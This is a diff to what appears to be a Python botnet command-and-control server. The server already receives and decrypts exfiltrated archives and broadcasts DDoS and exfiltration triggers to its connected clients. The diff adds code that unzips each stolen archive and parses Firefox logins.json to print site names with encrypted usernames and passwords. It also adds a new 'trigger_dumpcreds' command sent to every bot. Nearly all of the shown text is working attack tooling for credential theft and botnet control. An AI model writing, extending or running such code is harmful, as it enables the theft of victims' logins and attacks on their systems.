@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import socket, threading, base64, os
+import zipfile, json
 from Cryptodome.Cipher import AES
 from datetime import datetime
 
@@ -78,6 +79,22 @@ def exfil_listener():
                 f.write(plaintext)
             print(f"[EXFIL] ✅ Decrypted archive saved: {out_file}")
 
+            # 📦 Attempt to extract and parse Firefox credentials
+            extracted_dir = out_file + "_unzipped"
+            with zipfile.ZipFile(out_file, 'r') as zip_ref:
+                zip_ref.extractall(extracted_dir)
+
+            for root, _, files in os.walk(extracted_dir):
+                for file in files:
+                    if file == "logins.json":
+                        path = os.path.join(root, file)
+                        print(f"\n[🔐] Parsing Firefox logins.json: {path}")
+                        with open(path, "r", encoding="utf-8") as f:
+                            data = json.load(f)
+                            for entry in data.get("logins", []):
+                                print(f" - Site: {entry.get('hostname')}")
+                                print(f"   Username (enc): {entry.get('encryptedUsername')}")
+                                print(f"   Password (enc): {entry.get('encryptedPassword')}")
         except Exception as e:
             print(f"[!] Decryption failed: {e}")
 
@@ -93,7 +110,7 @@ def send_command():
                 clients[index].send(encrypt_message(" ".join(command)))
             except:
                 print("[!] Invalid target index.")
-        elif cmd.startswith("trigger_ddos") or cmd.startswith("trigger_exfil"):
+        elif cmd.startswith("trigger_ddos") or cmd.startswith("trigger_exfil") or cmd.startswith("trigger_dumpcreds"):
             for conn in clients:
                 try:
                     conn.send(encrypt_message(cmd))
